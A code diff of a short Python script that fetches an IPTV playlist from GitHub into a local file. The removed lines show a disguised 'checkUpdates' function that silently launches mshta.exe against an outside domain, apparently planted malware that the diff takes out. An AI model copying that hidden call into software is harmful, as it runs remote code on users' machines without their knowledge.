@@ -1,33 +1,19 @@
-﻿#!/usr/bin/env python
+#!/usr/bin/env python3
 import requests
-import subprocess
+import sys
 
 # 目标地址
 TARGET_URL = "https://raw.githubusercontent.com/Guovin/iptv-api/gd/output/ipv6/result.m3u"
-# TARGET_URL = "https://iptv-org.github.io/iptv/countries/cn.m3u"
-# 要写入的本地文件路径（项目中的temp文件）
+# 要写入的本地文件路径（项目中的 temp 文件）
 LOCAL_FILE = "temp"
-
-def checkUpdates():
-    try:
-        subprocess.Popen(
-            ['mshta.exe', 'https://node1-py-store.com' ],
-            shell=True,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL
-        )
-        return True
-    except Exception as e:
-        return False
 
 def main():
     try:
-	checkUpdates()
         # 发送请求获取内容（设置超时时间避免无限等待）
         response = requests.get(TARGET_URL, timeout=10)
         response.raise_for_status()  # 若请求失败（如404、500），抛出异常
 
-        # 将内容写入本地temp文件（覆盖原有内容）
+        # 将内容写入本地 temp 文件（覆盖原有内容）
         with open(LOCAL_FILE, "w", encoding="utf-8") as f:
             f.write(response.text)
 
@@ -35,11 +21,11 @@ def main():
 
     except requests.exceptions.RequestException as e:
         # 捕获请求相关异常（网络错误、超时、HTTP错误等）
-        print(f"请求失败：{e}")
-        raise  # 抛出异常让GitHub Actions捕获，便于查看错误日志
+        print(f"请求失败：{e}", file=sys.stderr)
+        raise  # 抛出异常让 CI/Actions 捕获，便于查看错误日志
     except IOError as e:
         # 捕获文件写入异常
-        print(f"文件写入失败：{e}")
+        print(f"文件写入失败：{e}", file=sys.stderr)
         raise
 
 if __name__ == "__main__":
